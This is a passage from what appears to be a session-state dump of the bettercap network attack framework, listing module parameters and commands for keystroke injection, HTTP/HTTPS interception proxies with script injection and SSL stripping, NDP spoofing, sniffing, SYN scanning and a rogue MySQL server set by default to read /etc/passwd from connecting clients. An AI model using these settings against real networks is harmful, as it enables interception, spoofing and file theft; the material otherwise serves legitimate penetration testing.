                'description': "Time in milliseconds to automatically sniff payloads from a device, once it's detected, in order to determine its type.",
                'default_value': '500',
                'current_value': '500',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'hid.ttl': {
                'name': 'hid.ttl',
                'type': 2,
                'description': 'Seconds of inactivity to consider a device as not in range.',
                'default_value': '1200',
                'current_value': '1200',
                'validator': '^[\\-\\+]?[\\d]+$'
            }
        },
        'handlers': [{
            'name': 'hid.recon on',
            'description': 'Start scanning for HID devices on the 2.4Ghz spectrum.',
            'parser': ''
        }, {
            'name': 'hid.recon off',
            'description': 'Stop scanning for HID devices on the 2.4Ghz spectrum.',
            'parser': ''
        }, {
            'name': 'hid.clear',
            'description': 'Clear all devices collected by the HID discovery module.',
            'parser': ''
        }, {
            'name': 'hid.sniff ADDRESS',
            'description': "Start sniffing a specific ADDRESS in order to collect payloads, use 'clear' to stop collecting.",
            'parser': '(?i)^hid\\.sniff ([a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}|clear)$'
        }, {
            'name': 'hid.show',
            'description': 'Show a list of detected HID devices on the 2.4Ghz spectrum.',
            'parser': ''
        }, {
            'name': 'hid.inject ADDRESS LAYOUT FILENAME',
            'description': 'Parse the duckyscript FILENAME and inject it as HID frames spoofing the device ADDRESS, using the LAYOUT keyboard mapping.',
            'parser': '(?i)^hid\\.inject ([a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2})\\s+(.+)\\s+(.+)$'
        }],
        'running': True,
        'state': {
            'injecting': False,
            'layouts': ['BE', 'BR', 'CA', 'CH', 'DE', 'DK', 'ES', 'FI', 'FR', 'GB', 'HR', 'IT', 'NO', 'PT', 'RU', 'SI', 'SV', 'TR', 'US'],
            'sniffing': ''
        }
    }, {
        'name': 'http.proxy',
        'description': 'A full featured HTTP proxy that can be used to inject malicious contents into webpages, all HTTP traffic will be redirected to it.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'http.port': {
                'name': 'http.port',
                'type': 2,
                'description': 'HTTP port to redirect when the proxy is activated.',
                'default_value': '80',
                'current_value': '80',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'http.proxy.address': {
                'name': 'http.proxy.address',
                'type': 0,
                'description': 'Address to bind the HTTP proxy to.',
                'default_value': '<interface address>',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'http.proxy.blacklist': {
                'name': 'http.proxy.blacklist',
                'type': 0,
                'description': 'Comma separated list of hostnames to skip while proxying (wildcard expressions can be used).',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'http.proxy.injectjs': {
                'name': 'http.proxy.injectjs',
                'type': 0,
                'description': 'URL, path or javascript code to inject into every HTML page.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'http.proxy.port': {
                'name': 'http.proxy.port',
                'type': 2,
                'description': 'Port to bind the HTTP proxy to.',
                'default_value': '8080',
                'current_value': '8080',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'http.proxy.redirect': {
                'name': 'http.proxy.redirect',
                'type': 1,
                'description': 'Enable or disable port redirection with iptables.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'http.proxy.script': {
                'name': 'http.proxy.script',
                'type': 0,
                'description': 'Path of a proxy JS script.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'http.proxy.sslstrip': {
                'name': 'http.proxy.sslstrip',
                'type': 1,
                'description': 'Enable or disable SSL stripping.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'http.proxy.whitelist': {
                'name': 'http.proxy.whitelist',
                'type': 0,
                'description': 'Comma separated list of hostnames to proxy if the blacklist is used (wildcard expressions can be used).',
                'default_value': '',
                'current_value': '',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'http.proxy on',
            'description': 'Start HTTP proxy.',
            'parser': ''
        }, {
            'name': 'http.proxy off',
            'description': 'Stop HTTP proxy.',
            'parser': ''
        }],
        'running': False,
        'state': {
            'stripper': None
        }
    }, {
        'name': 'http.server',
        'description': 'A simple HTTP server, to be used to serve files and scripts across the network.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'http.server.address': {
                'name': 'http.server.address',
                'type': 0,
                'description': 'Address to bind the http server to.',
                'default_value': '<interface address>',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'http.server.path': {
                'name': 'http.server.path',
                'type': 0,
                'description': 'Server folder.',
                'default_value': '.',
                'current_value': '.',
                'validator': ''
            },
            'http.server.port': {
                'name': 'http.server.port',
                'type': 2,
                'description': 'Port to bind the http server to.',
                'default_value': '80',
                'current_value': '80',
                'validator': '^[\\-\\+]?[\\d]+$'
            }
        },
        'handlers': [{
            'name': 'http.server on',
            'description': 'Start httpd server.',
            'parser': ''
        }, {
            'name': 'http.server off',
            'description': 'Stop httpd server.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'https.proxy',
        'description': 'A full featured HTTPS proxy that can be used to inject malicious contents into webpages, all HTTPS traffic will be redirected to it.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'https.port': {
                'name': 'https.port',
                'type': 2,
                'description': 'HTTPS port to redirect when the proxy is activated.',
                'default_value': '443',
                'current_value': '443',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'https.proxy.address': {
                'name': 'https.proxy.address',
                'type': 0,
                'description': 'Address to bind the HTTPS proxy to.',
                'default_value': '<interface address>',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'https.proxy.blacklist': {
                'name': 'https.proxy.blacklist',
                'type': 0,
                'description': 'Comma separated list of hostnames to skip while proxying (wildcard expressions can be used).',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'https.proxy.certificate': {
                'name': 'https.proxy.certificate',
                'type': 0,
                'description': 'HTTPS proxy certification authority TLS certificate file.',
                'default_value': '~/.bettercap-ca.cert.pem',
                'current_value': '~/.bettercap-ca.cert.pem',
                'validator': ''
            },
            'https.proxy.certificate.bits': {
                'name': 'https.proxy.certificate.bits',
                'type': 2,
                'description': 'Number of bits of the RSA private key of the generated HTTPS certificate.',
                'default_value': '4096',
                'current_value': '4096',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'https.proxy.certificate.commonname': {
                'name': 'https.proxy.certificate.commonname',
                'type': 0,
                'description': 'Common Name field of the generated HTTPS certificate.',
                'default_value': 'Go Daddy Secure Certificate Authority - G2',
                'current_value': 'Go Daddy Secure Certificate Authority - G2',
                'validator': '.*'
            },
            'https.proxy.certificate.country': {
                'name': 'https.proxy.certificate.country',
                'type': 0,
                'description': 'Country field of the generated HTTPS certificate.',
                'default_value': 'US',
                'current_value': 'US',
                'validator': '.*'
            },
            'https.proxy.certificate.locality': {
                'name': 'https.proxy.certificate.locality',
                'type': 0,
                'description': 'Locality field of the generated HTTPS certificate.',
                'default_value': 'Scottsdale',
                'current_value': 'Scottsdale',
                'validator': '.*'
            },
            'https.proxy.certificate.organization': {
                'name': 'https.proxy.certificate.organization',
                'type': 0,
                'description': 'Organization field of the generated HTTPS certificate.',
                'default_value': 'GoDaddy.com, Inc.',
                'current_value': 'GoDaddy.com, Inc.',
                'validator': '.*'
            },
            'https.proxy.certificate.organizationalunit': {
                'name': 'https.proxy.certificate.organizationalunit',
                'type': 0,
                'description': 'Organizational Unit field of the generated HTTPS certificate.',
                'default_value': 'https://certs.godaddy.com/repository/',
                'current_value': 'https://certs.godaddy.com/repository/',
                'validator': '.*'
            },
            'https.proxy.injectjs': {
                'name': 'https.proxy.injectjs',
                'type': 0,
                'description': 'URL, path or javascript code to inject into every HTML page.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'https.proxy.key': {
                'name': 'https.proxy.key',
                'type': 0,
                'description': 'HTTPS proxy certification authority TLS key file.',
                'default_value': '~/.bettercap-ca.key.pem',
                'current_value': '~/.bettercap-ca.key.pem',
                'validator': ''
            },
            'https.proxy.port': {
                'name': 'https.proxy.port',
                'type': 2,
                'description': 'Port to bind the HTTPS proxy to.',
                'default_value': '8083',
                'current_value': '8083',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'https.proxy.redirect': {
                'name': 'https.proxy.redirect',
                'type': 1,
                'description': 'Enable or disable port redirection with iptables.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'https.proxy.script': {
                'name': 'https.proxy.script',
                'type': 0,
                'description': 'Path of a proxy JS script.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'https.proxy.sslstrip': {
                'name': 'https.proxy.sslstrip',
                'type': 1,
                'description': 'Enable or disable SSL stripping.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'https.proxy.whitelist': {
                'name': 'https.proxy.whitelist',
                'type': 0,
                'description': 'Comma separated list of hostnames to proxy if the blacklist is used (wildcard expressions can be used).',
                'default_value': '',
                'current_value': '',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'https.proxy on',
            'description': 'Start HTTPS proxy.',
            'parser': ''
        }, {
            'name': 'https.proxy off',
            'description': 'Stop HTTPS proxy.',
            'parser': ''
        }],
        'running': False,
        'state': {
            'stripper': None
        }
    }, {
        'name': 'https.server',
        'description': 'A simple HTTPS server, to be used to serve files and scripts across the network.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'https.server.address': {
                'name': 'https.server.address',
                'type': 0,
                'description': 'Address to bind the http server to.',
                'default_value': '<interface address>',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'https.server.certificate': {
                'name': 'https.server.certificate',
                'type': 0,
                'description': 'TLS certificate file (will be auto generated if filled but not existing).',
                'default_value': '~/.bettercap-httpd.cert.pem',
                'current_value': '~/.bettercap-https.cert.pem',
                'validator': ''
            },
            'https.server.certificate.bits': {
                'name': 'https.server.certificate.bits',
                'type': 2,
                'description': 'Number of bits of the RSA private key of the generated HTTPS certificate.',
                'default_value': '4096',
                'current_value': '4096',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'https.server.certificate.commonname': {
                'name': 'https.server.certificate.commonname',
                'type': 0,
                'description': 'Common Name field of the generated HTTPS certificate.',
                'default_value': 'bettercap',
                'current_value': 'bettercap',
                'validator': '.*'
            },
            'https.server.certificate.country': {
                'name': 'https.server.certificate.country',
                'type': 0,
                'description': 'Country field of the generated HTTPS certificate.',
                'default_value': 'US',
                'current_value': 'US',
                'validator': '.*'
            },
            'https.server.certificate.locality': {
                'name': 'https.server.certificate.locality',
                'type': 0,
                'description': 'Locality field of the generated HTTPS certificate.',
                'default_value': '',
                'current_value': '',
                'validator': '.*'
            },
            'https.server.certificate.organization': {
                'name': 'https.server.certificate.organization',
                'type': 0,
                'description': 'Organization field of the generated HTTPS certificate.',
                'default_value': 'bettercap devteam',
                'current_value': 'bettercap devteam',
                'validator': '.*'
            },
            'https.server.certificate.organizationalunit': {
                'name': 'https.server.certificate.organizationalunit',
                'type': 0,
                'description': 'Organizational Unit field of the generated HTTPS certificate.',
                'default_value': 'https://bettercap.org/',
                'current_value': 'https://bettercap.org/',
                'validator': '.*'
            },
            'https.server.key': {
                'name': 'https.server.key',
                'type': 0,
                'description': 'TLS key file (will be auto generated if filled but not existing).',
                'default_value': '~/.bettercap-httpd.key.pem',
                'current_value': '~/.bettercap-https.key.pem',
                'validator': ''
            },
            'https.server.path': {
                'name': 'https.server.path',
                'type': 0,
                'description': 'Server folder.',
                'default_value': '.',
                'current_value': '/usr/share/bettercap/ui',
                'validator': ''
            },
            'https.server.port': {
                'name': 'https.server.port',
                'type': 2,
                'description': 'Port to bind the http server to.',
                'default_value': '443',
                'current_value': '443',
                'validator': '^[\\-\\+]?[\\d]+$'
            }
        },
        'handlers': [{
            'name': 'https.server on',
            'description': 'Start https server.',
            'parser': ''
        }, {
            'name': 'https.server off',
            'description': 'Stop https server.',
            'parser': ''
        }],
        'running': True,
        'state': {}
    }, {
        'name': 'mac.changer',
        'description': 'Change active interface mac address.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'mac.changer.address': {
                'name': 'mac.changer.address',
                'type': 0,
                'description': 'Hardware address to apply to the interface.',
                'default_value': '<random mac>',
                'current_value': '2e:48:dd:94:c3:4c',
                'validator': '[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}'
            },
            'mac.changer.iface': {
                'name': 'mac.changer.iface',
                'type': 0,
                'description': 'Name of the interface to use.',
                'default_value': '<interface name>',
                'current_value': 'wlan1',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'mac.changer on',
            'description': 'Start mac changer module.',
            'parser': ''
        }, {
            'name': 'mac.changer off',
            'description': 'Stop mac changer module and restore original mac address.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'mdns.server',
        'description': 'A mDNS server module to create multicast services or spoof existing ones.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'mdns.server.address': {
                'name': 'mdns.server.address',
                'type': 0,
                'description': 'IPv4 address of the mDNS service.',
                'default_value': '<interface address>',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'mdns.server.address6': {
                'name': 'mdns.server.address6',
                'type': 0,
                'description': 'IPv6 address of the mDNS service.',
                'default_value': '<interface address6>',
                'current_value': '',
                'validator': '^[:a-fA-F0-9]{6,}$'
            },
            'mdns.server.domain': {
                'name': 'mdns.server.domain',
                'type': 0,
                'description': 'mDNS domain.',
                'default_value': 'local.',
                'current_value': 'local.',
                'validator': ''
            },
            'mdns.server.host': {
                'name': 'mdns.server.host',
                'type': 0,
                'description': 'mDNS hostname to advertise on the network.',
                'default_value': 'kali-rpi.',
                'current_value': 'kali-rpi.',
                'validator': ''
            },
            'mdns.server.info': {
                'name': 'mdns.server.info',
                'type': 0,
                'description': 'Comma separated list of informative TXT records for the mDNS server.',
                'default_value': 'rpBA=DE:AD:BE:EF:CA:FE, rpAD=abf99d4ff73f, rpHI=ec5fb3caf528, rpHN=20f8fb46e2eb, rpVr=164.16, rpHA=7406bd0eff69',
                'current_value': 'rpBA=DE:AD:BE:EF:CA:FE, rpAD=abf99d4ff73f, rpHI=ec5fb3caf528, rpHN=20f8fb46e2eb, rpVr=164.16, rpHA=7406bd0eff69',
                'validator': ''
            },
            'mdns.server.port': {
                'name': 'mdns.server.port',
                'type': 2,
                'description': 'Port of the mDNS service.',
                'default_value': '52377',
                'current_value': '52377',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'mdns.server.service': {
                'name': 'mdns.server.service',
                'type': 0,
                'description': 'mDNS service name to advertise on the network.',
                'default_value': '_companion-link._tcp.',
                'current_value': '_companion-link._tcp.',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'mdns.server on',
            'description': 'Start mDNS server.',
            'parser': ''
        }, {
            'name': 'mdns.server off',
            'description': 'Stop mDNS server.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'mysql.server',
        'description': 'A simple Rogue MySQL server, to be used to exploit LOCAL INFILE and read arbitrary files from the client.',
        'author': 'Bernardo Rodrigues (https://twitter.com/bernardomr)',
        'parameters': {
            'mysql.server.address': {
                'name': 'mysql.server.address',
                'type': 0,
                'description': 'Address to bind the mysql server to.',
                'default_value': '<interface address>',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'mysql.server.infile': {
                'name': 'mysql.server.infile',
                'type': 0,
                'description': 'File you want to read. UNC paths are also supported.',
                'default_value': '/etc/passwd',
                'current_value': '/etc/passwd',
                'validator': ''
            },
            'mysql.server.outfile': {
                'name': 'mysql.server.outfile',
                'type': 0,
                'description': 'If filled, the INFILE buffer will be saved to this path instead of being logged.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'mysql.server.port': {
                'name': 'mysql.server.port',
                'type': 2,
                'description': 'Port to bind the mysql server to.',
                'default_value': '3306',
                'current_value': '3306',
                'validator': '^[\\-\\+]?[\\d]+$'
            }
        },
        'handlers': [{
            'name': 'mysql.server on',
            'description': 'Start mysql server.',
            'parser': ''
        }, {
            'name': 'mysql.server off',
            'description': 'Stop mysql server.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'ndp.spoof',
        'description': 'Keep spoofing selected hosts on the network by sending spoofed NDP router advertisements.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'ndp.spoof.neighbour': {
                'name': 'ndp.spoof.neighbour',
                'type': 0,
                'description': 'Neighbour IPv6 address to spoof, clear to disable NA.',
                'default_value': 'fe80::1',
                'current_value': 'fe80::1',
                'validator': ''
            },
            'ndp.spoof.prefix': {
                'name': 'ndp.spoof.prefix',
                'type': 0,
                'description': 'IPv6 prefix for router advertisements spoofing, clear to disable RA.',
                'default_value': 'd00d::',
                'current_value': 'd00d::',
                'validator': ''
            },
            'ndp.spoof.prefix.length': {
                'name': 'ndp.spoof.prefix.length',
                'type': 2,
                'description': 'IPv6 prefix length for router advertisements.',
                'default_value': '64',
                'current_value': '64',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'ndp.spoof.targets': {
                'name': 'ndp.spoof.targets',
                'type': 0,
                'description': 'Comma separated list of IPv6 victim addresses.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'ndp.spoof on',
            'description': 'Start NDP spoofer.',
            'parser': ''
        }, {
            'name': 'ndp.spoof off',
            'description': 'Stop NDP spoofer.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'net.probe',
        'description': 'Keep probing for new hosts on the network by sending dummy UDP packets to every possible IP on the subnet.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'net.probe.mdns': {
                'name': 'net.probe.mdns',
                'type': 1,
                'description': 'Enable mDNS discovery probes.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'net.probe.nbns': {
                'name': 'net.probe.nbns',
                'type': 1,
                'description': 'Enable NetBIOS name service discovery probes.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'net.probe.throttle': {
                'name': 'net.probe.throttle',
                'type': 2,
                'description': 'If greater than 0, probe packets will be throttled by this value in milliseconds.',
                'default_value': '10',
                'current_value': '10',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'net.probe.upnp': {
                'name': 'net.probe.upnp',
                'type': 1,
                'description': 'Enable UPNP discovery probes.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'net.probe.wsd': {
                'name': 'net.probe.wsd',
                'type': 1,
                'description': 'Enable WSD discovery probes.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            }
        },
        'handlers': [{
            'name': 'net.probe on',
            'description': 'Start network hosts probing in background.',
            'parser': ''
        }, {
            'name': 'net.probe off',
            'description': 'Stop network hosts probing in background.',
            'parser': ''
        }],
        'running': True,
        'state': {}
    }, {
        'name': 'net.recon',
        'description': 'Read periodically the ARP cache in order to monitor for new hosts on the network.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'net.show.filter': {
                'name': 'net.show.filter',
                'type': 0,
                'description': 'Defines a regular expression filter for net.show',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'net.show.limit': {
                'name': 'net.show.limit',
                'type': 2,
                'description': 'Defines limit for net.show',
                'default_value': '0',
                'current_value': '0',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'net.show.meta': {
                'name': 'net.show.meta',
                'type': 1,
                'description': 'If true, the net.show command will show all metadata collected about each endpoint.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'net.show.sort': {
                'name': 'net.show.sort',
                'type': 0,
                'description': 'Defines sorting field (ip, mac, seen, sent, rcvd) and direction (asc or desc) for net.show',
                'default_value': 'ip asc',
                'current_value': 'ip asc',
                'validator': '(ip|mac|seen|sent|rcvd) (desc|asc)'
            }
        },
        'handlers': [{
            'name': 'net.recon on',
            'description': 'Start network hosts discovery.',
            'parser': ''
        }, {
            'name': 'net.recon off',
            'description': 'Stop network hosts discovery.',
            'parser': ''
        }, {
            'name': 'net.clear',
            'description': 'Clear all endpoints collected by the hosts discovery module.',
            'parser': ''
        }, {
            'name': 'net.show',
            'description': 'Show cache hosts list (default sorting by ip).',
            'parser': ''
        }, {
            'name': 'net.show ADDRESS1, ADDRESS2',
            'description': 'Show information about a specific comma separated list of addresses (by IP or MAC).',
            'parser': 'net.show (.+)'
        }, {
            'name': 'net.show.meta ADDRESS1, ADDRESS2',
            'description': 'Show meta information about a specific comma separated list of addresses (by IP or MAC).',
            'parser': 'net\\.show\\.meta (.+)'
        }],
        'running': True,
        'state': {}
    }, {
        'name': 'net.sniff',
        'description': 'Sniff packets from the network.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'net.fuzz.layers': {
                'name': 'net.fuzz.layers',
                'type': 0,
                'description': 'Types of layer to fuzz.',
                'default_value': 'Payload',
                'current_value': 'Payload',
                'validator': ''
            },
            'net.fuzz.rate': {
                'name': 'net.fuzz.rate',
                'type': 3,
                'description': 'Rate in the [0.0,1.0] interval of packets to fuzz.',
                'default_value': '1.0',
                'current_value': '1.0',
                'validator': '^[\\-\\+]?[\\d]+(\\.\\d+)?$'
            },
            'net.fuzz.ratio': {
                'name': 'net.fuzz.ratio',
                'type': 3,
                'description': 'Rate in the [0.0,1.0] interval of bytes to fuzz for each packet.',
                'default_value': '0.4',
                'current_value': '0.4',
                'validator': '^[\\-\\+]?[\\d]+(\\.\\d+)?$'
            },
            'net.fuzz.silent': {
                'name': 'net.fuzz.silent',
                'type': 1,
                'description': 'If true it will not report fuzzed packets.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'net.sniff.filter': {
                'name': 'net.sniff.filter',
                'type': 0,
                'description': 'BPF filter for the sniffer.',
                'default_value': 'not arp',
                'current_value': 'not arp',
                'validator': ''
            },
            'net.sniff.local': {
                'name': 'net.sniff.local',
                'type': 1,
                'description': 'If true it will consider packets from/to this computer, otherwise it will skip them.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'net.sniff.output': {
                'name': 'net.sniff.output',
                'type': 0,
                'description': 'If set, the sniffer will write captured packets to this file.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'net.sniff.regexp': {
                'name': 'net.sniff.regexp',
                'type': 0,
                'description': 'If set, only packets matching this regular expression will be considered.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'net.sniff.source': {
                'name': 'net.sniff.source',
                'type': 0,
                'description': 'If set, the sniffer will read from this pcap file instead of the current interface.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'net.sniff.verbose': {
                'name': 'net.sniff.verbose',
                'type': 1,
                'description': 'If true, every captured and parsed packet will be sent to the events.stream for displaying, otherwise only the ones parsed at the application layer (sni, http, etc).',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            }
        },
        'handlers': [{
            'name': 'net.sniff stats',
            'description': 'Print sniffer session configuration and statistics.',
            'parser': ''
        }, {
            'name': 'net.sniff on',
            'description': 'Start network sniffer in background.',
            'parser': ''
        }, {
            'name': 'net.sniff off',
            'description': 'Stop network sniffer in background.',
            'parser': ''
        }, {
            'name': 'net.fuzz on',
            'description': 'Enable fuzzing for every sniffed packet containing the specified layers.',
            'parser': ''
        }, {
            'name': 'net.fuzz off',
            'description': 'Disable fuzzing',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'packet.proxy',
        'description': 'A Linux only module that relies on NFQUEUEs in order to filter packets.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'packet.proxy.chain': {
                'name': 'packet.proxy.chain',
                'type': 0,
                'description': 'Chain name of the iptables rule.',
                'default_value': 'OUTPUT',
                'current_value': 'OUTPUT',
                'validator': ''
            },
            'packet.proxy.plugin': {
                'name': 'packet.proxy.plugin',
                'type': 0,
                'description': 'Go plugin file to load and call for every packet.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'packet.proxy.queue.num': {
                'name': 'packet.proxy.queue.num',
                'type': 2,
                'description': 'NFQUEUE number to bind to.',
                'default_value': '0',
                'current_value': '0',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'packet.proxy.rule': {
                'name': 'packet.proxy.rule',
                'type': 0,
                'description': 'Any additional iptables rule to make the queue more selective (ex. --destination 8.8.8.8).',
                'default_value': '',
                'current_value': '',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'packet.proxy on',
            'description': 'Start the NFQUEUE based packet proxy.',
            'parser': ''
        }, {
            'name': 'packet.proxy off',
            'description': 'Stop the NFQUEUE based packet proxy.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'syn.scan',
        'description': 'A module to perform SYN port scanning.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'syn.scan.show-progress-every': {
                'name': 'syn.scan.show-progress-every',
                'type': 2,
                'description': 'Period in seconds for the scanning progress reporting.',
                'default_value': '1',
                'current_value': '1',
                'validator': '^[\\-\\+]?[\\d]+$'
            }
        },
        'handlers': [{
            'name': 'syn.scan stop',
            'description': 'Stop the current syn scanning session.',
            'parser': 'syn\\.scan (stop|off)'
        }, {
            'name': 'syn.scan IP-RANGE START-PORT END-PORT',
            'description': 'Perform a syn port scanning against an IP address within the provided ports range.',
            'parser': 'syn.scan ([^\\s]+) ?(\\d+)?([\\s\\d]*)?'
        }, {
            'name': 'syn.scan.progress',
            'description': 'Print progress of the current syn scanning session.',
            'parser': 'syn\\.scan\\.progress'
        }],
        'running': False,
        'state': {
            'progress': 0,
            'scanning': []
        }
    }, {
        'name': 'tcp.proxy',
        'description': 'A full featured TCP proxy and tunnel, all TCP traffic to a given remote address and port will be redirected to it.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'tcp.address': {
                'name': 'tcp.address',
                'type': 0,
                'description': 'Remote address of the TCP proxy.',
                'default_value': '',
                'current_value': '',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'tcp.port': {
                'name': 'tcp.port',
                'type': 2,
                'description': 'Remote port to redirect when the TCP proxy is activated.',
                'default_value': '443',
                'current_value': '443',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'tcp.proxy.address': {
                'name': 'tcp.proxy.address',
                'type': 0,
                'description': 'Address to bind the TCP proxy to.',
                'default_value': '<interface address>',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'tcp.proxy.port': {
                'name': 'tcp.proxy.port',
                'type': 2,
                'description': 'Port to bind the TCP proxy to.',
                'default_value': '8443',
                'current_value': '8443',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'tcp.proxy.script': {
                'name': 'tcp.proxy.script',
                'type': 0,
                'description': 'Path of a TCP proxy JS script.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'tcp.tunnel.address': {
                'name': 'tcp.tunnel.address',
                'type': 0,
                'description': 'Address to redirect the TCP tunnel to (optional).',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'tcp.tunnel.port': {
                'name': 'tcp.tunnel.port',
                'type': 2,
                'description': 'Port to redirect the TCP tunnel to (optional).',
                'default_value': '0',
                'current_value': '0',
                'validator': '^[\\-\\+]?[\\d]+$'
            }
        },
        'handlers': [{
            'name': 'tcp.proxy on',
            'description': 'Start TCP proxy.',
            'parser': ''
        }, {
            'name': 'tcp.proxy off',
            'description': 'Stop TCP proxy.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'ticker',
        'description': 'A module to execute one or more commands every given amount of seconds.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'ticker.commands': {
                'name': 'ticker.commands',
                'type': 0,
                'description': 'List of commands separated by a ;',
                'default_value': 'clear; net.show; events.show 20',
                'current_value': 'clear; net.show; events.show 20',
                'validator': ''
            },
            'ticker.period': {
                'name': 'ticker.period',
                'type': 2,
                'description': 'Ticker period in seconds',
                'default_value': '1',
                'current_value': '1',
                'validator': '^[\\-\\+]?[\\d]+$'
            }
        },
        'handlers': [{
            'name': 'ticker on',
            'description': 'Start the ticker.',
            'parser': ''
        }, {
            'name': 'ticker off',
            'description': 'Stop the ticker.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'ui',
        'description': "A module to manage bettercap's UI. Disabled in Kali: use apt install bettercap-ui to install and/or update ui.",
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {},
        'handlers': [],
        'running': False,
        'state': {}
    }, {
        'name': 'update',
        'description': "A module to check for bettercap's updates.",
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {},
        'handlers': [{
            'name': 'update.check on',
            'description': 'Check latest available stable version and compare it with the one being used.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'wifi',
        'description': 'A module to monitor and perform wireless attacks on 802.11.',
